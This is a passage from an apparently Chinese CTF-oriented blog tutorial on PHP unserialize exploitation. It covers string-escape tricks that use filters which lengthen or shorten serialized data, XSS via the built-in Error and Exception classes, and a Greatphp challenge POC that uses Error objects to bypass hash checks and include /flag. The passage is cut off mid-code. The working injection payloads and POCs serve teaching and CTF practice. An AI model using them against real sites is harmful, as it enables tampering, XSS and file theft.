title="替换修改后导致序列化字符串变长"></a>替换修改后导致序列化字符串变长</h4><p>实验代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看下php序列化代码特征：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>序列化字符串都是以一<code>&quot;;&#125;</code>结束的，所以如果我们把<code>&quot;;&#125;</code>带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。<br>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度s错误则反序列化就会失败。</p><p>失败原因：正常的语法是需要用<code>&quot;;</code>去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</p><p>回到上面的代码，</p><p>如果我们将name变量中添加bb则程序就会报错，因为<code>bb</code>将被<code>filter</code>函数替换成<code>ccc</code>，<code>ccc</code>的长度比<code>bb</code>多1，这样前面的s所代表的长度为2但是内容却变长了，成了<code>ccc</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaabb&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaabb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaaccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>因为<code>s:6</code>，所以name只读取<code>aaaacc</code>,末尾的c就读取不到，这就形成了字符逃逸了，但是我们想修改<code>pass</code>里面的值该怎么办呢，</p><p>肯定需要闭合，所以在<code>name</code>处加上<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>来间接修改pass的值，</p><p>如果我们只是单纯的把它加进去的话，就像下面这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>再反序化：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">Object</span> ( [name] =&gt; <span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span>hacker&quot;;&#125; [pass] =&gt; <span class="hljs-number">123456</span> )<br></code></pre></td></tr></table></figure><p>发现pass没有改变，因为<code>$name</code>被序列化后的长度是固定的，在反序列化后<code>$name</code>仍然为<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>，<code>$pass</code>仍然为<code>123456</code></p><p>所以我们需要加入bb来让后面的字符逃逸</p><p>因为<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>的长度为27，如果我们再加上27个bb，那最终的长度将增加27，就让后面的27个字逃逸出来了，就成为pass里面的东西，顺便闭合了序列化结构</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">81</span>:<span class="hljs-string">&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125; //包括&quot;</span>及之前就<span class="hljs-number">81</span>个了，所以后面的name就不再读取了，刚好又是pass的结构<br><span class="hljs-attribute">A</span> Object (<span class="hljs-meta"> [name] =&gt; ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc [pass] =&gt; hacker )</span><br></code></pre></td></tr></table></figure><p>就把pass里面的值修改了</p><h5 id="例题：-0CTF-2016-piapiapia"><a href="#例题：-0CTF-2016-piapiapia" class="headerlink" title="例题：[0CTF 2016]piapiapia"></a>例题：[0CTF 2016]piapiapia</h5><p>详情见：<a href="https://www.cnblogs.com/w0s1np/p/14236380.html">https://www.cnblogs.com/w0s1np/p/14236380.html</a></p><h4 id="替换修改之后导致序列化字符串变短"><a href="#替换修改之后导致序列化字符串变短" class="headerlink" title="替换修改之后导致序列化字符串变短"></a>替换修改之后导致序列化字符串变短</h4><p>实验代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> preg_replace( <span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sign&#x27;</span>]; <br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span> = str_rep(serialize(<span class="hljs-variable">$test</span>));<br>printf(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span> = unserialize(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入name和sign，number值是固定的’2020’，经过 <code>序列化--&gt;敏感字替换为空(长度变短)--&gt;反序列化</code> 的过程之后再输出结果。</p><p><img src="https://z3.ax1x.com/2021/04/09/cNvXIf.png" alt="gddr"></p><p>接下来利用漏洞，通过输入<code>name</code>和<code>sign</code>来间接修改number的值：</p><p>我们要修改number的值，就要在sign中加入<code>&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;</code>，其长度为27</p><p>但是直接加肯定不行，因为在str_rep函数中如果检测到’php’、’test’关键字就把其替换为空，那么就利用这一点，我们可以故意输入敏感字符，替换为空之后来实现字符逃逸。</p><p>所以构造payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?name=testtesttesttesttesttest&amp;sign=hello<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:4:&quot;</span>eval<span class="hljs-string">&quot;;s:6:&quot;</span>numbe<span class="hljs-string">r&quot;;s:4:&quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/04/09/cNvzRg.png" alt="sg"></p><p>我们在name中输入了输入了6个test，替换为空后这样就腾出了24个字符的空间，正好包含进了<code>&quot;;s:4:&quot;sign&quot;;s:54:&quot;hello</code>，由于<code>&quot;;s:4:&quot;sign&quot;;s:54:&quot;hello</code>成了name的内容，所以我们还要在后面加个<code>&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval</code>作为sign序列化的内容。</p><p>后面就是修改的number了，所以最后面的那个2020就被抛弃了，所以就修改了number</p><h5 id="例题：-安洵杯-2019-easy-serialize-php"><a href="#例题：-安洵杯-2019-easy-serialize-php" class="headerlink" title="例题：[安洵杯 2019]easy_serialize_php"></a>例题：[安洵杯 2019]easy_serialize_php</h5><p>详情见：<a href="https://www.cnblogs.com/w0s1np/p/14239490.html">https://www.cnblogs.com/w0s1np/p/14239490.html</a></p><h3 id="PHP原生类"><a href="#PHP原生类" class="headerlink" title="PHP原生类"></a>PHP原生类</h3><h4 id="Error-内置类XSS"><a href="#Error-内置类XSS" class="headerlink" title="Error 内置类XSS"></a>Error 内置类XSS</h4><ul><li>适用于php7版本</li><li>在开启报错的情况下</li></ul><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w0s1np&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io//wzimg/6.png" alt="n"></p><h4 id="Exception-内置类XSS"><a href="#Exception-内置类XSS" class="headerlink" title="Exception 内置类XSS"></a>Exception 内置类XSS</h4><ul><li>适用于php5、7版本</li><li>开启报错的情况下</li></ul><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w0s1np&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span><br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br></code></pre></td></tr></table></figure><p><img src="/wzimg/6.png" alt="n"></p><h4 id="Error-Exception-类绕过哈希比较"><a href="#Error-Exception-类绕过哈希比较" class="headerlink" title="Error /Exception 类绕过哈希比较"></a>Error /Exception 类绕过哈希比较</h4><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p><p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p><p>在<code>Error</code>和<code>Exception</code>这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p><p>以Error为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>payload in D:\phpstudy_pro\WWW\index.php:2 <br>Stack trace: <br>#0 &#123;main&#125;<br></code></pre></td></tr></table></figure><p>这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p><p>在来看看下一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>payload in D:\phpstudy_pro\WWW\index.php:2 <br>Stack trace: <br>#0 &#123;main&#125; <br><br><span class="hljs-keyword">Error: </span>payload in D:\phpstudy_pro\WWW\index.php:2 <br>Stack trace: <br>#0 &#123;main&#125;<br></code></pre></td></tr></table></figure><p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p><p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p><h5 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a>[2020 极客大挑战]Greatphp</h5><p>进入题目，给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要进入eval()执行代码需要先通过上面的if语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure><p>考点是<code>md5()</code>和<code>sha1()</code>可以对一个类进行<code>hash</code>，并且会触发这个类的 <code>__toString</code> 方法；且当<code>eval()</code>函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法。</p><p>由于题目用<code>preg_match</code>过滤了小括号无法调用函数，所以我们尝试直接 <code>include &quot;/flag&quot;</code> 将flag包含进来即可。由于过滤了引号，我们直接用url取反绕过即可。</p><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-comment">/* </span><br><span class="hljs-comment">或使用[~(取反)][!%FF]的形式，</span><br><span class="hljs-comment">即: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;    </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; </span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span 